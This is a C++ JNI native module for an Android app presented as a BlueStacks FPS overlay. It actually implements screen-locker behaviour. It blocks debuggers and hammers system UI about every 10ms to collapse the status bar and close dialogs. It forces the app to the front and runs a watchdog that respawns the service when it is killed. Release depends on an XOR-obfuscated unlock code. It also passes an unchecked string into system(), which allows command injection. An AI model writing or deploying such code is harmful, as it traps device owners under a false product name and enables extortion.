#include <jni.h>
#include <string>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <cstdio>
#include <signal.h>
#include <sys/ptrace.h>

JavaVM* jvm = nullptr;
jobject serviceObject = nullptr;
pid_t watchdogPid = -1;
bool isRunning = false;

void* aggressiveLoop(void* args) {
    // Anti-Debugging: Jika ada debugger nempel, aplikasi exit
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
        exit(0);
    }

    JNIEnv* env;
    if (jvm->AttachCurrentThread(&env, nullptr) != JNI_OK) return nullptr;

    int uiCounter = 0;
    int forceCounter = 0;

    while (isRunning) {
        if (serviceObject == nullptr) break;

        jclass clazz = env->GetObjectClass(serviceObject);
        jmethodID collapseMethod = env->GetMethodID(clazz, "collapseStatusBar", "()V");
        jmethodID closeDialogsMethod = env->GetMethodID(clazz, "closeSystemDialogs", "()V");
        jmethodID forceFrontMethod = env->GetMethodID(clazz, "forceFront", "()V");

        // Panggil penutup UI sistem setiap 10ms (Stabil & Tanpa Glitch)
        if (++uiCounter >= 10) {
            env->CallVoidMethod(serviceObject, collapseMethod);
            env->CallVoidMethod(serviceObject, closeDialogsMethod);
            uiCounter = 0;
        }

        // Tarik aplikasi ke depan setiap 50ms (lebih agresif)
        if (++forceCounter >= 50) {
            env->CallVoidMethod(serviceObject, forceFrontMethod);
            forceCounter = 0;
        }

        usleep(1000);
    }

    jvm->DetachCurrentThread();
    return nullptr;
}

void startWatchdog(const char* cmd) {
    watchdogPid = fork();
    pid_t pid = watchdogPid;
    if (pid == 0) { // Proses anak (Watchdog)
        pid_t ppid = getppid();
        while (true) {
            if (kill(ppid, 0) == -1) { // Jika parent (Java) mati
                system(cmd); // Jalankan kembali servis
                exit(0);
            }
            sleep(1); // Cek setiap 1 detik
        }
    }
}

extern "C" JNIEXPORT void JNICALL
Java_com_bluestacks_fpsoverlay_FPSService_startNativeAggression(JNIEnv* env, jobject thiz, jstring serviceName) {
    if (isRunning) return;
    
    env->GetJavaVM(&jvm);
    serviceObject = env->NewGlobalRef(thiz);
    isRunning = true;

    const char* cmdStr = env->GetStringUTFChars(serviceName, nullptr);
    char fullCmd[256];
    sprintf(fullCmd, "am startservice --user 0 -n %s", cmdStr);
    
    startWatchdog(fullCmd);
    env->ReleaseStringUTFChars(serviceName, cmdStr);

    pthread_t thread;
    pthread_create(&thread, nullptr, aggressiveLoop, nullptr);
}

extern "C" JNIEXPORT void JNICALL
Java_com_bluestacks_fpsoverlay_FPSService_stopNativeAggression(JNIEnv* env, jobject thiz) {
    isRunning = false;
    if (watchdogPid > 0) {
        kill(watchdogPid, SIGKILL);
        watchdogPid = -1;
    }
    if (serviceObject != nullptr) {
        env->DeleteGlobalRef(serviceObject);
        serviceObject = nullptr;
    }
}

// BlueStacks Security Engine - FPS Protection Module
// Implementasi hashing sederhana namun kuat di level native
extern "C" JNIEXPORT jboolean JNICALL
Java_com_bluestacks_fpsoverlay_FPSService_verifyAdvancedKey(JNIEnv* env, jobject thiz, jstring input) {
    if (input == nullptr) return JNI_FALSE;

    const char* nativeInput = env->GetStringUTFChars(input, nullptr);
    std::string inputStr(nativeInput);

    // Kunci Baru: "02042009" (8 Karakter)
    // Hasil XOR dengan 0x0E:
    // '0'^0x0E = 0x3E, '2'^0x0E = 0x3C, dst.
    unsigned char obfuscated_key[] = {
        0x3E, 0x3C, 0x3E, 0x3A, 0x3C, 0x3E, 0x3E, 0x37
    };
    size_t key_len = 8;

    bool isValid = false;
    if (inputStr.length() == key_len) {
        isValid = true;
        for (size_t i = 0; i < key_len; i++) {
            // Melakukan XOR balik untuk verifikasi
            if (inputStr[i] != (char)(obfuscated_key[i] ^ 0x0E)) {
                isValid = false;
                break;
            }
        }
    }

    env->ReleaseStringUTFChars(input, nativeInput);
    return isValid ? JNI_TRUE : JNI_FALSE;
}